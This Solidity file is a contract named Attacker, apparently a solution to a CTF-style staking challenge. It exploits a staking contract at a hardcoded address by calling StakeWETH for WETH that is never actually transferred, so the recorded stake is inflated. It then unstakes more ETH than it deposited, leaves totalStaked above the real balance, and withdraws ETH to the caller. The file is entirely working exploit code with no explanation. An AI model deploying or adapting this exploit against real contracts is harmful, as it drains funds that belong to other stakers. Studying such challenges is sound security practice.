// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

pragma solidity >=0.8.2 <0.9.0;

interface Stake {
    function totalStaked() external returns (uint256);
    function UserStake(address user) external returns (uint256);
    function Stakers(address user) external returns (bool);

    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external  returns (bool);
}

contract Attacker {
    Stake public stake = Stake(0xe7D4FcE6416df4D25e95396d310B89563D9B31f0);
    IERC20 public WETH = IERC20(0x9527491292A7646B06d5b3453785de76bA60C3Fb);

    function run() public payable {
        require(preCheck(), "Check failed");
        
        require(stakeEth(), "Failed stake ETH");
        require(bugStakeWeth(), "Failed bug stake WETH");
        require(unstakeMain(), "Failed unstake main");
        require(address(stake).balance == 1, "Wrong stake balance");
        require(fictiveUnstake(), "Failed fictive unstake");
        require(check(), "Check failed");

        require(withdraw(), "Withdraw failed");
    }

    function stakeEth() internal returns (bool) {
        (bool success, ) = address(stake).call{value: (0.001 ether + 1)}(
            abi.encodeWithSignature("StakeETH()")
        );
        return success;
    }

    function bugStakeWeth() internal returns (bool) {
        require(WETH.approve(address(stake), 1 ether), "Failed WETH.approve");
        return !stake.StakeWETH(0.001 ether + 2);
    }

    function unstakeMain() internal returns (bool) {
        return stake.Unstake(0.001 ether);
    }

    function fictiveUnstake() internal returns (bool) {
        require(!stake.Unstake(0.001 ether), "Failed fUnstake");
        return true;
    }

    function withdraw() internal returns (bool) {
        (bool success, ) = msg.sender.call{value: 0.001 ether}("");
        return success;
    }

    receive() external payable { }

    function preCheck() internal returns (bool) {
        require(stake.Stakers(msg.sender), "Player not staker");

        require(stake.UserStake(msg.sender) == 0, "Player stake not 0");

        return true;
    }

    function check() internal returns (bool) {
        uint256 stakeBalance = address(stake).balance;
        require(stakeBalance > 0, "Stake balance not greater 0");

        require(stake.totalStaked() > stakeBalance, "totalStaked less than stake.Eth.balance");

        return true;
    }
}